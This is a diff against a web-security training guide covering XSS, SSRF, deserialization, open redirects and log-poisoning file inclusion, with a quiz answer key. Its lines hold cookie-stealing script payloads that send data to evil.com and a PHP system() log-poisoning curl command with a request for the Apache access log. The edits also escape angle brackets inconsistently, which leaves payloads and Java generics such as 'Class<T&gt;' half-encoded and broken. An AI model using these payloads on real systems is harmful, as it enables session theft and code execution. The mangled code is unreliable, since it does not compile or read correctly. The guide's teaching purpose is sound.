@@ -423,16 +423,16 @@ String filter = "(uid=" + safe + ")";
 
 | Impact | Medium | Critical | Medium-High |
 
-| Example | ?q=<script>alert(1)</script> | post=<script>fetch("/steal")</script> | #<img src=x onerror=alert(1)> |
+| Example | ?q=<script>alert(1)&lt;/script&gt; | post=<script>fetch("/steal")&lt;/script&gt; | #<img src=x onerror=alert(1)> |
 
 ### 4.1 Reflected XSS
 
 **Technical Explanation:** Server reflects user input in the response without encoding. Payload delivered via crafted URL.
 #### Attack Steps
 
-1. Attacker crafts URL: http://victim.com/search?q=<script>new Image().src="http://evil.com/steal?c="+document.cookie</script>
+1. Attacker crafts URL: http://victim.com/search?q=<script>new Image().src="http://evil.com/steal?c="+document.cookie&lt;/script&gt;
 2. Victim clicks link
-3. Server echoes: <div>You searched for: <script>...</script></div>
+3. Server echoes: <div>You searched for: <script>...</script>&lt;/div&gt;
 4. Browser executes script, sending cookies to attacker
 #### Vulnerable Code
 
@@ -473,7 +473,7 @@ public String search(@RequestParam String q, Model model) {
 
 #### Attack Steps
 
-1. Attacker posts comment: <script>fetch("https://evil.com/log?c="+document.cookie)</script>
+1. Attacker posts comment: <script>fetch("https://evil.com/log?c="+document.cookie)&lt;/script&gt;
 2. Server stores malicious comment in database
 3. Every visitor loads the page — comment rendered — script executes
 4. Attacker collects session cookies
@@ -562,7 +562,7 @@ document.getElementById('greeting').innerHTML = DOMPurify.sanitize(name);
 
 |-------|---------|-------------|
 
-| 1 — Output Encoding | HTML entity encode <>&"\' | Low if context-aware |
+| 1 — Output Encoding | HTML entity encode &lt;>&"\' | Low if context-aware |
 
 | 2 — CSP | script-src "self" blocks inline | Medium (if nonce/hash used) |
 
@@ -1287,7 +1287,7 @@ Design a complete security architecture for an e-commerce application considerin
    - C) WAF can block zero-days, RASP cannot
    - D) RASP is always free
 <details>
-<summary>Answers</summary>
+<summary>Answers&lt;/summary&gt;
 1. B (Injection → exploitability: 3, Easy), 2. B, 3. B, 4. C, 5. A
 </details>
 ## 6. Server-Side Request Forgery (SSRF)
@@ -1402,7 +1402,7 @@ curl -X POST --data-binary @payload.bin http://victim.com/deserialize
 
 `java
 // GOOD: JSON with type validation
-public <T> T safeDeserialize(String json, Class<T> type) {
+public &lt;T> T safeDeserialize(String json, Class<T&gt; type) {
     ObjectMapper mapper = new ObjectMapper();
     mapper.activateDefaultTyping(
         BasicPolymorphicTypeValidator.builder()
@@ -1473,7 +1473,7 @@ http://victim.com/redirect?url=http://evil.com/phishing
 `java
 @GetMapping(""/redirect"")
 public String redirect(@RequestParam String path) {
-    Set<String> allowed = Set.of(""/dashboard"", ""/profile"", ""/settings"");
+    Set&lt;String&gt; allowed = Set.of(""/dashboard"", ""/profile"", ""/settings"");
     if (!allowed.contains(path)) {
         return ""redirect:/error"";
     }
@@ -1529,7 +1529,7 @@ Steps:
 `ash
 # Poison the log
 
-curl -H ""User-Agent: <?php system(\['cmd']); ?>"" http://vulnerable.com/
+curl -H ""User-Agent: &lt;?php system(\['cmd']); ?&gt;"" http://vulnerable.com/
 # Include the log
 
 curl ""http://vulnerable.com/index.php?page=../../../var/log/apache2/access.log&cmd=id""
